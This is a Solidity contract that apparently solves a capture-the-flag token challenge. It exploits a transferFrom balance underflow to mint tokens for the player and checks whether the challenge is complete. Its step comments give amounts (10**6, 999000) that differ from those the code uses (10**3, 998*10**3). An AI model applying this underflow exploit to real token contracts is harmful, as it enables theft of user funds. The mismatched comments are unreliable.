pragma solidity ^0.8.13;

import "./IChallenge.sol";
import "hardhat/console.sol";


contract Solution {

    address public owner;
    address public player;
    IChallenge private challenge;

    constructor(address _challenge, address _player) {

        player = _player;
        owner = msg.sender;
        challenge = IChallenge(_challenge);
    }

    // 1.- First execute 'approve(<this_contract>)' from the player EOA account
    // 2.- Execute 'transferFrom(player, player, 10**6)' from this contract
    // 3.- Execute 'transfer(player, 999000)' from this contract
    // 4.- Challenge is solved

    function underFlowSenderTokens() public returns(bool) {
        challenge.transferFrom(player, player, 10**3);
        challenge.transfer(player, 998*10**3);
        return challenge.isComplete();
    }
}

